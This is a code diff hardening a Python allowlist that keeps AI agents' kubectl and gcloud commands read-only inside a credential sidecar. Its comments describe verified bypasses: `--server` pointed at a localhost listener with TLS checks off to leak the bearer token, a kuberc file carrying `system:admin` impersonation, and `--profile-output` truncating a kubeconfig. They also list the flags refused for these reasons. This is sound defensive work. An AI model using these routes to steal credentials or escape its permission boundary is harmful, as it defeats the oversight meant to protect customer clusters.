@@ -7,12 +7,21 @@ policy.json matches a credential pattern, so `kubectl delete ns prod` reaches
 the sidecar and runs. What stopped that until now was the Platform Agent's
 persona, which is not a permission boundary.
 
-This is the backup layer under Kubernetes impersonation, not the boundary
-itself (see the F10 agent permission model). The ordering is what makes an
-allowlist acceptable here: under impersonation the API server authorizes as the
-requesting user, so a normalizer that misreads an argv loses a redundant check.
-The same mistake in a check-then-act design would let the command through
-unauthorized.
+**Today this module is the only thing enforcing the read-only posture.** There
+is no layer underneath it: a normalizer that misreads an argv lets the command
+through, and the command runs against the customer's cluster. Every refusal
+here should be read with that in mind — a false allow is not a lost redundant
+check, it is the whole control.
+
+Kubernetes impersonation is planned, not deployed (see the F10 agent permission
+model; it is a later slice). Once it lands the API server will authorize each
+request as the requesting *human user* rather than as the agent, and this
+module becomes the second of two layers. Until then, do not weaken a rule here
+on the theory that something downstream will catch it. Nothing does.
+
+Note also that the current deployment shares one Google service account across
+every agent. That is the defect impersonation is meant to fix, not a mitigation
+this module can lean on.
 
 An allowlist, which is the opposite of the choice GIT_MUTATING_SUBCOMMANDS
 makes in credential_proxy.py. The asymmetry differs. Over-blocking git inside a
@@ -62,6 +71,15 @@ _GOVERNED_TOOLS = frozenset({"kubectl", "gcloud"})
 # server-side dry-run write, so it needs write RBAC to succeed at all. Allowing
 # it under a read-only grant would buy a confusing failure rather than a
 # capability.
+#
+# `config view` is absent deliberately, and this one is a disclosure rather than
+# a mutation. `kubectl config view` prints `token: REDACTED`, but
+# `kubectl config view --flatten` prints the token itself, and inlines
+# `client-key-data` for certificate users -- verified on v1.36.3. The verb is
+# the whole subtree here: refusing `config view` outright is self-contained,
+# whereas teaching the credential denylist about `--flatten` means editing a
+# regex that lives in the Go operator. `current-context` and `get-contexts`
+# stay, which is what the agent actually needs.
 KUBECTL_READ_VERBS: frozenset[tuple[str, ...]] = frozenset(
     {
         ("api-resources",),
@@ -79,9 +97,25 @@ KUBECTL_READ_VERBS: frozenset[tuple[str, ...]] = frozenset(
         ("auth", "whoami"),
         ("config", "current-context"),
         ("config", "get-contexts"),
-        ("config", "view"),
         ("rollout", "history"),
         ("rollout", "status"),
+    }
+)
+
+# Two-word forms that are refused even though their first word is allowed on its
+# own. A single-word read verb lets any word follow it -- `("cluster-info",)` is
+# in KUBECTL_READ_VERBS and `evaluate` falls back to `verb[:1]`, so
+# `cluster-info dump` inherits the allowance. It should not:
+# `kubectl cluster-info dump --output-directory=DIR` writes a tree of files at
+# any path the agent names, inside the credential sidecar.
+#
+# This is the inverse of how `rollout` is handled. `("rollout",)` is not listed,
+# so `rollout status` has to be spelled out and `rollout restart` is refused by
+# default. `cluster-info` has to stay allowed on its own, so the exception is
+# spelled out instead. Checked before the allowlist in `evaluate`.
+KUBECTL_REFUSED_SUBCOMMANDS: frozenset[tuple[str, ...]] = frozenset(
+    {
+        ("cluster-info", "dump"),
     }
 )
 
@@ -91,6 +125,14 @@ KUBECTL_READ_VERBS: frozenset[tuple[str, ...]] = frozenset(
 # that would cause a silent bypass nobody sees. Under this denylist of
 # value-taking flags, an unknown flag that takes a value becomes unreadable --
 # someone reports it, and we update this set.
+#
+# Membership here means "we know this flag's arity", not "this flag is
+# permitted". Several of these are refused outright by _KUBECTL_IDENTITY_FLAGS
+# and _KUBECTL_FILE_WRITE_FLAGS below, and they stay listed here so that the
+# parser still consumes their values correctly -- an argv that is going to be
+# refused should still be *read* correctly, so the refusal names the right flag
+# and the logs are not misleading. This is the same separation
+# _GCLOUD_FLAGS_WITH_VALUE and _GCLOUD_IDENTITY_FLAGS already make.
 _KUBECTL_FLAGS_WITH_VALUE = frozenset(
     {
         "-n", "--namespace", "--context", "--cluster", "--kubeconfig",
@@ -141,6 +183,70 @@ _GCLOUD_IDENTITY_FLAGS = frozenset(
     {
         "--access-token-file", "--configuration", "--account",
         "--credential-file-override", "--authorization-token-file", "--authority-selector",
+    }
+)
+
+# kubectl's equivalents of _GCLOUD_IDENTITY_FLAGS, and the reason this set
+# exists at all: for five review rounds gcloud refused caller-supplied identity
+# while every kubectl flag that does the same thing sat on the allow side,
+# because it was listed for its arity and nothing read that list as a grant.
+#
+# Two distinct capabilities are refused here, and both are identity in the sense
+# that matters -- who we authenticate as, or who receives the credential.
+#
+# 1. Supplying a principal. --token, --username/--password,
+#    --client-certificate/--client-key and --user all authenticate as somebody
+#    the broker did not choose. --user names a kubeconfig user entry, which is
+#    only as trustworthy as the kubeconfig; the proxy regenerates that file, but
+#    the flag should not be the thing that decision rests on.
+#
+# 2. Redirecting the credential. `kubectl get pods --server=https://127.0.0.1:8443
+#    --insecure-skip-tls-verify` was verified on v1.36.3 to hand the bearer token
+#    to a listener on that address -- static tokens and exec-plugin credentials
+#    alike. The agent container and this sidecar share a network namespace, so
+#    the attacker's listener is a localhost port and no egress is involved.
+#    Nothing downstream catches this: the request never reaches a Kubernetes API
+#    server, so there is no authorizer to fail closed. --certificate-authority
+#    and --tls-server-name are here for the same reason -- they are how a
+#    redirected --server is made to look legitimate to TLS.
+#
+# --kuberc is a member so that removing the dedicated check below still leaves
+# it refused. See _kubectl_has_kuberc.
+#
+# Deliberately *not* here:
+# - --kubeconfig, because credential_proxy.py reroutes it (see
+#   CommandExecutor._reroute_kubeconfig_flags): the path the agent names is
+#   replaced with a file the proxy generated, so the flag cannot select an
+#   agent-authored document. Refusing it would break the Cluster Agent pin.
+# - --context and --cluster, because they select an entry *within* that
+#   proxy-generated kubeconfig. Every server URL and user in it was written by
+#   `gcloud container clusters get-credentials`, not by the agent. If the
+#   rerouting in credential_proxy.py is ever removed, both belong in this set.
+_KUBECTL_IDENTITY_FLAGS = frozenset(
+    {
+        "-s", "--server",
+        "--token", "--user", "--username", "--password",
+        "--client-certificate", "--client-key",
+        "--certificate-authority", "--tls-server-name",
+        "--insecure-skip-tls-verify",
+        "--kuberc",
+    }
+)
+
+# kubectl global flags that write to a path the agent chooses. None of them
+# change identity; they are refused because this process runs in the credential
+# sidecar, with the sidecar's filesystem.
+#
+# `kubectl get pods --profile=cpu --profile-output=/opt/data/state/kubeconfigs/gke_p_l_c.yaml`
+# truncates that file to zero bytes, verified on v1.36.3, and it does so even
+# when the command itself fails -- the profile file is created before the API
+# call. That path is a proxy-managed kubeconfig, so the primitive is arbitrary
+# file truncation inside the trusted container. --cache-dir is milder but the
+# same shape: it creates directories and writes discovery and HTTP cache files
+# under any path given.
+_KUBECTL_FILE_WRITE_FLAGS = frozenset(
+    {
+        "--profile", "--profile-output", "--cache-dir",
     }
 )
 
@@ -226,7 +332,20 @@ def _gcloud_has_flags_file(argv: list[str]) -> str | None:
     by _refuses_impersonation. The file itself is under the agent's control,
     so we cannot safely scan it: the agent could rewrite it between our check
     and gcloud's read, a race we cannot win. Refusing it outright is the only
-    safe option, consistent with how credential_proxy.py handles kubeconfigs.
+    safe option.
+
+    This is *not* the mechanism credential_proxy.py uses for `--kubeconfig`.
+    That flag is rerouted, not refused: the proxy reads one string out of the
+    named file and regenerates the document, so the agent keeps the ability to
+    name a cluster while the content it authored is never opened. Rerouting
+    works there because a kubeconfig has exactly one field the proxy needs and
+    can rebuild the rest from the GKE API. A flags file has no such shape --
+    there is nothing to regenerate it from -- so refusal is all that is left.
+
+    An earlier version of this comment described the two as one mechanism, and
+    that conflation is how `--kuberc` was missed for five review rounds: it is a
+    flags file wearing kubectl's clothes, and "we handle config files by
+    rerouting them" made it look already covered. See _kubectl_has_kuberc.
     """
     for token in argv[1:]:
         name, _, _ = token.partition("=")
@@ -268,22 +387,12 @@ def _gcloud_words_and_flag(argv: list[str]) -> tuple[list[str] | None, str | Non
     return words, None
 
 
-def _gcloud_words(argv: list[str]) -> list[str] | None:
-    """The bare words of a gcloud argv, with flags and their values removed.
-
-    Returns None if the command is unreadable (e.g., contains an unknown flag
-    that could hide the command path). Use _gcloud_words_and_flag to also get
-    the offending flag name for logging.
-    """
-    words, _ = _gcloud_words_and_flag(argv)
-    return words
-
-
 def _gcloud_is_read_only(words: list[str]) -> bool:
     """Is the command a listed read-only gcloud command?
 
     Args:
-        words: The result of _gcloud_words(). The caller ensures this is not None.
+        words: The words from _gcloud_words_and_flag(). The caller ensures this
+            is not None.
 
     The command path must match exactly a tuple in GCLOUD_READ_COMMANDS.
     Positional arguments after the verb are allowed: `container clusters
@@ -359,20 +468,67 @@ def _kubectl_verb_and_flag(argv: list[str]) -> tuple[tuple[str, ...] | None, str
     return (word1,), None
 
 
-def _kubectl_verb(argv: list[str]) -> tuple[str, ...] | None:
-    """The leading verb sequence in a kubectl argv, or None if unreadable.
-
-    Use _kubectl_verb_and_flag to also get the offending flag name for logging.
-    """
-    verb, _ = _kubectl_verb_and_flag(argv)
-    return verb
-
-
 def _refuses_impersonation(argv: list[str]) -> str | None:
     """Return the offending impersonation flag name, or None if no impersonation found."""
     for token in argv[1:]:
         name, _, _ = token.partition("=")
         if name in _IMPERSONATION_FLAGS:
+            return name
+    return None
+
+
+def _kubectl_has_kuberc(argv: list[str]) -> str | None:
+    """Return '--kuberc' if found in argv, or None otherwise.
+
+    kubectl's answer to `gcloud --flags-file`, and it launders the impersonation
+    refusal above. A kuberc file carries per-command default options, and that
+    feature is on by default in v1.36.3 (it takes KUBECTL_KUBERC=false or the
+    KUBERC=off feature gate to disable, neither of which this module can rely
+    on). A file the agent controls holding:
+
+        apiVersion: kubectl.config.k8s.io/v1beta1
+        kind: Preference
+        defaults:
+        - command: get
+          options: [{name: as, default: system:admin}]
+
+    makes `kubectl --kuberc /agent/writable/kr.yaml get pods` send
+    `Impersonate-User: system:admin` -- verified on v1.36.3. The `--as` never
+    appears in argv, so _refuses_impersonation cannot see it.
+
+    Reading the file and scanning it for `as` is not an option. The file lives
+    on the shared workspace volume and the agent can rewrite it between our
+    read and kubectl's, a race we cannot win and should not try to. The only
+    safe answer is to refuse the flag outright, which is what gcloud's
+    --flags-file already does.
+    """
+    for token in argv[1:]:
+        name, _, _ = token.partition("=")
+        if name == "--kuberc":
+            return "--kuberc"
+    return None
+
+
+def _kubectl_refuses_identity_change(argv: list[str]) -> str | None:
+    """Return the offending identity or credential-redirection flag, or None.
+
+    The kubectl counterpart of _gcloud_refuses_identity_change. Checked by exact
+    membership on the flag name (before the `=` separator), so both `--flag
+    value` and `--flag=value` are caught, and checked over the whole argv rather
+    than only the leading global flags -- kubectl accepts these anywhere.
+    """
+    for token in argv[1:]:
+        name, _, _ = token.partition("=")
+        if name in _KUBECTL_IDENTITY_FLAGS:
+            return name
+    return None
+
+
+def _kubectl_refuses_file_write(argv: list[str]) -> str | None:
+    """Return the offending sidecar-filesystem-writing flag, or None."""
+    for token in argv[1:]:
+        name, _, _ = token.partition("=")
+        if name in _KUBECTL_FILE_WRITE_FLAGS:
             return name
     return None
 
@@ -412,6 +568,50 @@ def evaluate(argv: list[str]) -> Decision:
         )
 
     if argv[0] == "kubectl":
+        # Ordered before the identity check, the same way gcloud checks
+        # --flags-file before _GCLOUD_IDENTITY_FLAGS: the refusal a caller sees
+        # should name the file-of-flags problem rather than the identity one it
+        # happens to be a vehicle for.
+        kuberc_flag = _kubectl_has_kuberc(argv)
+        if kuberc_flag:
+            return Decision(
+                allowed=False,
+                rule_id="kubernetes.kuberc-forbidden",
+                message=(
+                    "--kuberc reads options from a file under the agent's control, "
+                    "including impersonation defaults that never appear in the "
+                    "command line. We cannot read that file without a race "
+                    "condition, so we refuse it outright."
+                ),
+                offending_flag=kuberc_flag,
+            )
+
+        identity_flag = _kubectl_refuses_identity_change(argv)
+        if identity_flag:
+            return Decision(
+                allowed=False,
+                rule_id="kubernetes.identity-change-forbidden",
+                message=(
+                    "Identity and API server address belong to the broker. Remove "
+                    "--server, --token, --user, --client-certificate, "
+                    "--insecure-skip-tls-verify and the other credential flags to "
+                    "use the cluster and identity the proxy configured."
+                ),
+                offending_flag=identity_flag,
+            )
+
+        file_write_flag = _kubectl_refuses_file_write(argv)
+        if file_write_flag:
+            return Decision(
+                allowed=False,
+                rule_id="kubernetes.file-write-forbidden",
+                message=(
+                    "--profile, --profile-output and --cache-dir write to a path of "
+                    "the caller's choosing inside the credential sidecar. Remove them."
+                ),
+                offending_flag=file_write_flag,
+            )
+
         verb, unknown_flag = _kubectl_verb_and_flag(argv)
         if verb is None:
             return Decision(
@@ -419,6 +619,16 @@ def evaluate(argv: list[str]) -> Decision:
                 rule_id="kubernetes.unreadable-command",
                 message="Could not identify a kubectl verb, so the command was refused.",
                 offending_flag=unknown_flag,
+            )
+        if verb in KUBECTL_REFUSED_SUBCOMMANDS:
+            return Decision(
+                allowed=False,
+                rule_id="kubernetes.read-only",
+                message=(
+                    "Agents hold read-only access to Kubernetes. Propose this change "
+                    "as a pull request instead."
+                ),
+                verb_tuple=verb,
             )
         if verb in KUBECTL_READ_VERBS or verb[:1] in KUBECTL_READ_VERBS:
             return _ALLOWED
